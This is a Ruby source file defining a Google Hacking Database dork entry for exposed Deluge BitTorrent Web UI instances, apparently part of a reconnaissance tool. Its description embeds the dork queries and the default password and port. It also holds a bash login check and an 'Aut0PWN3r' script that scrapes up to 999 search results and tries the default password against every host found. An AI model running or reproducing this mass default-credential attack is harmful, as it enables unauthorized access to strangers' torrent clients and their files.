module Dorks
   class Dork4741 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 4741",
            ghdb_url: "https://www.exploit-db.com/ghdb/4741",
            severity: "5",
            category: "files_containing_juicy_info",
            publish_date: "2018-04-03",
            author: "Pancaker",
            dork: <<~EDORK,
Deluge - Web UI (BitTorrent Client - Download/Upload/Seed/Control/File Explorer) v1+v2
EDORK
            description: <<~EDESC
GoogleDork v1 ~ `intitle:"Deluge: Web UI 1.3" `
GoogleDork v2 ~ `intitle:"Deluge: Web UI 1.3" Filters. Status; Details; Files; Peers; Options. Downloaded: Uploaded:`
Default password: `deluge` ~ https://dev.deluge-torrent.org/wiki/UserGuide/ThinClient#ClientSetup1
Default port: `8112` ~ https://dev.deluge-torrent.org/wiki/UserGuide/ThinClient#ClientSetup1
- - -
## Bash
```
url="http://target.com:8112/json"
pass="deluge"
req=$( curl \\
-s \\
--header 'Content-Type: application/json' \\
--data '{"method":"auth.login","params":["'${pass}'"],"id":1}' \\
--compressed \\
"${url}" )
echo ${req} | grep -q '"result": true' \\
&& echo 'w000h000!' \\
|| echo 'b00'
```
- - -
## Aut0PWN3r
//brew install googler//
```
googler \\
--count 999 \\
--unfilter \\
--json \\
--noprompt \\
'intitle:"Deluge: Web UI 1.3" -exploit -vulnerability' \\
| awk -F'"' '/"url"/ {print $4}' \\
> /tmp/results.txt
for x in $( cat /tmp/results.txt ); do
curl \\
-s \\
--header 'Content-Type: application/json' \\
--data '{"method":"auth.login","params":["deluge"],"id":1}' \\
--compressed \\
--max-time 5 \\
"${x}/json" \\
| grep -q true \\
&& echo "[*] w000h000! ~ ${x}" \\
|| echo "[-] b00 ~ ${x}"
done
```
- - -
## Other Work
- ruTorrent ~ https://www.exploit-db.com/ghdb/4652/
- Deluge v3 ~ https://www.exploit-db.com/ghdb/4742/
EDESC
         })

      end
   end
end
